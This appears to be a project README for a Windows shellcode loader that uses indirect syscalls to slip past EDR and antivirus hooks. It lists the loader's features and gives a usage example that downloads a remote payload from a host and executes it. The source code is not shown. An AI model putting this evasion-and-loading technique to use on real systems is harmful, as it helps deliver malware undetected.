
# Indirect Syscall Loader

This project demonstrates a stealthy shellcode loader for Windows x64 that uses **indirect syscalls** to bypass user-mode API hooks used by EDR and antivirus software.

## Features
- Dynamic syscall number and address resolution from `ntdll.dll`.
- Custom assembly stubs for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, and `NtWaitForSingleObject`.
- HTTPS payload download using `WinINet`.
- Direct syscalls for memory allocation, writing, and execution.

## Usage
```bash
loader.exe <HOST> <PATH> <PORT>
````

Example:

```bash
loader.exe 192.168.100.192 /payload.bin 443
```

## More Information

For a detailed explanation of how this works, visit:
[https://portfolio-three-alpha-27.vercel.app/Blogs/indirect-system-call](https://portfolio-three-alpha-27.vercel.app/Blogs/indirect-system-call)

---

⚠️ **Disclaimer**: This code is for educational and research purposes only. Do not use it for malicious activities.

```
